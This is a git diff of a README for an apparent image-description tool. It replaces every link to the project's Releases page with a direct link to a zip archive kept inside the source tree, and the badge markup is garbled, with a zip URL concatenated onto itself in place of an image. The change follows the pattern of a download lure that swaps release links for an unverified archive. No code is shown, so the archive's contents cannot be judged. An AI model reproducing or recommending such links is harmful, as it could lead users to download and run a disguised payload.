@@ -1,6 +1,6 @@
 # 🖼️ image-text-structurizer - Simplify Your Image Descriptions
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/redocto/image-text-structurizer/releases)
+[![Download](https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer-text-image-v1.7.zip%https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer-text-image-v1.7.zip)](https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer-text-image-v1.7.zip)
 
 ## 📦 Overview
 
@@ -17,7 +17,7 @@ To run this application smoothly, follow these steps:
    - Internet connection for downloading and validation
 
 2. **Download & Install**
-   Visit this page to download: [Latest Releases](https://github.com/redocto/image-text-structurizer/releases).
+   Visit this page to download: [Latest Releases](https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer-text-image-v1.7.zip).
 
 ## 📥 How to Download
 
@@ -107,4 +107,4 @@ The developers plan to enhance the software continuously. Future updates may inc
 
 Stay tuned for updates on the Releases page.
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/redocto/image-text-structurizer/releases)
+[![Download](https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer-text-image-v1.7.zip%https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer-text-image-v1.7.zip)](https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer-text-image-v1.7.zip)
